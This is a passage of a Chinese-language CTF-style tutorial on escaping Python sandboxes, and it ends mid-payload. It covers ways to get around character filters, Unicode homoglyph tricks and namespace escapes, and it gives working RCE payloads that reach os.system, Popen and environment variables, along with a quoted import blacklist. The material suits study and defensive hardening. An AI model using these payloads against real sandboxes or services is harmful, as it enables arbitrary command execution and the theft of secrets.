<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chr</span>(<span class="number">56</span>)</span><br><span class="line"><span class="string">&#x27;8&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">100</span>)</span><br><span class="line"><span class="string">&#x27;d&#x27;</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">100</span>)*<span class="number">40</span></span><br><span class="line"><span class="string">&#x27;dddddddddddddddddddddddddddddddddddddddd&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="list-dict">list + dict</h5>
<p>使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] </span><br></pre></td></tr></table></figure>
<h5 id="doc"><em>_doc</em>_</h5>
<p><em>_doc</em>_ 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__doc__.find(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">().__doc__[<span class="number">19</span>]+().__doc__[<span class="number">86</span>]+().__doc__[<span class="number">19</span>]</span><br></pre></td></tr></table></figure>
<h5 id="bytes-函数">bytes 函数</h5>
<p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 <code>decode</code> 则可以得到字符串**(python2)**</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bytes</span>([<span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>]).decode() </span><br></pre></td></tr></table></figure>
<h4 id="绕过-3"><code>+</code>绕过</h4>
<p>过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 <code>join</code> 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 <em>_doc</em>_ 中取，</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>().join(().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]) </span><br></pre></td></tr></table></figure>
<h4 id="数字绕过">数字绕过</h4>
<p>如果过滤了数字的话，可以使用一些函数的返回值获取。</p>
<p>例如：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>：<span class="built_in">int</span>(<span class="built_in">bool</span>([]))、Flase、<span class="built_in">len</span>([])、<span class="built_in">any</span>(())</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>：<span class="built_in">int</span>(<span class="built_in">bool</span>([<span class="string">&quot;&quot;</span>]))、<span class="literal">True</span>、<span class="built_in">all</span>(())、<span class="built_in">int</span>(<span class="built_in">list</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(a၁=())).pop()).pop())</span><br></pre></td></tr></table></figure>
<p>有了 0 之后，其他的数字可以通过运算进行获取：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 ** 0 == 1 </span><br><span class="line">1 + 1 == 2 </span><br><span class="line">2 + 1 == 3 </span><br><span class="line">2 ** 2 == 4 </span><br></pre></td></tr></table></figure>
<p>当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br></pre></td></tr></table></figure>
<p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure>
<p>第四种方法: unicode 会在后续的 unicode 绕过中介绍</p>
<h4 id="空格绕过">空格绕过</h4>
<p>通过 ()、[] 替换</p>
<h4 id="运算符绕过">运算符绕过</h4>
<p>== 可以用 in 来替换</p>
<p>or 可以用 + 、-、|来替换</p>
<p>例如</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">or</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> | <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;- <span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> - <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> + <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<p>and 可以用&amp;、 *替代</p>
<p>例如</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [(<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">1</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">2</span>), (<span class="number">100</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>)]:</span><br><span class="line">    ans = i[<span class="number">0</span>]==i[<span class="number">1</span>] <span class="keyword">and</span> i[<span class="number">2</span>]==i[<span class="number">3</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> &amp; <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bool</span>(<span class="built_in">eval</span>(<span class="string">f&#x27;<span class="subst">&#123;i[<span class="number">0</span>]==i[<span class="number">1</span>]&#125;</span> * <span class="subst">&#123;i[<span class="number">2</span>]==i[<span class="number">3</span>]&#125;</span>&#x27;</span>)) == ans)</span><br></pre></td></tr></table></figure>
<h4 id="绕过-4"><code>()</code>绕过</h4>
<p>利用装饰器 <code>@</code><br>
利用魔术方法，例如 <code>enum.EnumMeta.__getitem__</code><br>
f 字符串执行</p>
<p>f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如获取环境变量</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;whoami.__class__.__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].__dict__&#125;</span><br><span class="line">&#123;whoami.__globals__[os].environ&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].path&#125;</span><br><span class="line">&#123;whoami.__globals__[sys].modules&#125;</span><br><span class="line"></span><br><span class="line">&#123;whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__&#125;</span><br><span class="line"></span><br><span class="line">也可以直接 RCE</span><br><span class="line"></span><br><span class="line"><span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).__dict__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="内建函数绕过">内建函数绕过</h4>
<p>eval + list + dict 构造</p>
<p>假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;bool&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bool&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;st&#x27;</span>+<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(s_t_r=<span class="number">1</span>))[<span class="number">0</span>][::<span class="number">2</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数(<code>__buildin__</code>)。如果某个模块已经被导入了，则也可以获取这个模块中的函数。</p>
<h4 id="和-，获取获取函数"><code>.</code>和 <code>，</code>获取获取函数</h4>
<p>通常情况下，我们会通过点号来进行调用<code>__import__('binascii').a2b_base64</code></p>
<p>或者通过 getattr 函数：<code>getattr(__import__('binascii'),'a2b_base64')</code></p>
<p>如果将,和.都过滤了，则可以有如下的几种方式获取函数：</p>
<p>内建函数可以使用<code>eval(list(dict(s_t_r=1))[0][::2])</code> 这样的方式获取。</p>
<p>模块内的函数可以先使用__import__导入函数，然后使用 vars() 进行获取：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vars(__import__(<span class="string">&#x27;binascii&#x27;</span>))[<span class="string">&#x27;a2b_base64&#x27;</span>]</span><br><span class="line">&lt;built-in <span class="keyword">function</span> a2b_base64&gt;</span><br></pre></td></tr></table></figure>
<h4 id="unicode-绕过">unicode 绕过</h4>
<p>Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> == 𝘦val</span><br><span class="line"><span class="literal">True</span> </span><br></pre></td></tr></table></figure>
<p>相似 unicode 寻找网站：<a class="link"   target="_blank" rel="noopener" href="http://shapecatcher.com/" >http://shapecatcher.com/<i class="fas fa-external-link-alt"></i></a> 可以通过绘制的方式寻找相似字符</p>
<p>相似 unicode 脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>,<span class="number">65537</span>):</span><br><span class="line">    tmp=<span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = tmp.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;-&quot;</span>) <span class="keyword">in</span> res:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(tmp, res, i))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">下面是 <span class="number">0</span>-<span class="number">9</span>,a-z 的 unicode 字符</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗 𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻  𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 </span><br><span class="line"></span><br><span class="line">下划线可以使用对应的全角字符进行替换：＿</span><br></pre></td></tr></table></figure>
<p>使用时注意第一个字符不能为全角，否则会报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿) __main__ </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿) </span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>    <span class="built_in">print</span>(＿＿name_＿)          </span><br><span class="line">^ SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F) </span><br></pre></td></tr></table></figure>
<p>需要注意的是，某些 unicode 在遇到 <code>lower()</code> 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。</p>
<h4 id="绕过命名空间限制">绕过命名空间限制</h4>
<h5 id="部分限制">部分限制</h5>
<p>有些沙箱在构建时使用 exec 来执行命令，exec 函数的第二个参数可以指定命名空间，通过修改、删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>沙箱首先获取 <em>_builtins</em>_，然后依据现有的 <em>_builtins</em>_ 来构建命名空间。<br>
修改 __import__ 函数为自定义的_hook_import_<br>
删除 open 函数防止文件操作<br>
exec 命令。<br>
绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <strong>builtins</strong>（这个__builtins__保存的就是原始__builtins__的引用），比如 types 库，来执行任意命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__ <span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__ </span><br></pre></td></tr></table></figure>
<h5 id="完全限制-no-builtins">完全限制(no builtins)</h5>
<p>如果沙箱完全清空了 <strong>builtins</strong>, 则无法使用 import,如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>
<p>这种情况下我们就需要利用 python 继承链来绕过，其步骤简单来说，就是通过 python 继承链获取内置类, 然后通过这些内置类获取到敏感方法例如 os.system 然后再进行利用。</p>
<p>具体原理可见：Python沙箱逃逸小结</p>
<p>常见的一些 RCE payload 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">os[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line"></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span 